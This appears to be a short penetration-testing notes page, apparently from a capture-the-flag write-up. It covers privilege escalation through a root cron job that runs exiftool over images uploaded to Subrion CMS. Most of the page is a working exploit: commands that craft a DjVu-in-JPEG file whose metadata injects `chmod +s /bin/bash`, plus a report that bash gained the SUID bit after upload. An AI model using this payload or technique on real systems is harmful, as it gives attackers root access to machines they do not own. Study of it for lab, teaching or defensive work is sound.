# Exiftool Priv Esc

{% embed url="https://bing0o.github.io/posts/exfiltrated/" %}

```
* *	* * *	root	bash /opt/image-exif.sh
cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"

```

The script extracts exif data from all the jpegs in the upload directory of subrion. If we can inject some metadata that allow us to remotely execute commands, we could execute commands as root since the script is runnign as root.&#x20;

Execute the following commands to generate exif data that makes bash runable by normal users as root.&#x20;

```
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
```

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-54.png?w=1024)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-54.png)

We upload this malicious **exploit.jpg** to the **Subrion CMS** again and after like 10-15 seconds our /bin/bash had SUID bit.

[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-02.png?w=951)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-02.png)[![](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-05.png?w=992)](https://grumpygeekwrites.files.wordpress.com/2021/09/2021-09-07\_06-05.png)
